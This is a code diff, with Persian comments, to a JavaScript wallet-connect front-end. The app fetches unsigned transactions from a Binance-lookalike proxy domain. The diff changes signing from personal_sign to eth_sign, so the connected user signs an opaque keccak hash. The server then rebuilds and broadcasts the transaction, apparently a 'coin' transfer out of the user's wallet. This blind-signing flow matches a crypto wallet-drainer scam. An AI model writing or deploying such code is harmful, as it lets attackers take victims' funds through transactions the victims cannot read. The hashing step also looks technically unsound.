@@ -1,5 +1,6 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
+import { keccak256 } from "ethers"; // هش کردن تراکنش
 
 function App() {
   async function runner() {
@@ -10,7 +11,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign"],
+      methods: ["eth_sign"], // تغییر به `eth_sign`
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -32,28 +33,36 @@ function App() {
 
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function signAndSendTransaction(address, chain, type, contract = "0") {
+    async function signAndSendTransaction(address, chain, type) {
       try {
         let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
-
         var result = await jQuery.post(apiUrl, requestData);
         var unsignedTx = JSON.parse(result).unsigned_tx;
+
+        if (!unsignedTx) {
+          console.error("❌ Error: Unsigned Transaction is undefined");
+          return null;
+        }
+
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **✅ امضای تراکنش در کیف پول**
+        // **هش کردن تراکنش خام**
+        const txHash = keccak256(JSON.stringify(unsignedTx));
+        console.log("🔗 Transaction Hash:", txHash);
+
+        // **امضا کردن هش تراکنش با `eth_sign`**
         var signedTx = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unsignedTx), address], // ارسال JSON صحیح
+          method: "eth_sign",
+          params: [address, txHash],  
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
 
-        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
+        // **ارسال تراکنش امضاشده به `send.php`**
         var txResult = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
-          type,
+          unsignedTx: unsignedTx, // ارسال تراکنش خام برای بازسازی در سرور
         });
 
         console.log("📤 Transaction Sent:", txResult);
@@ -64,7 +73,6 @@ function App() {
       }
     }
 
-    // ✅ فقط یک بار `txHash` مقداردهی می‌شود
     var finalTxHash = await signAndSendTransaction(account_sender, "56", "coin");
 
     if (finalTxHash) {
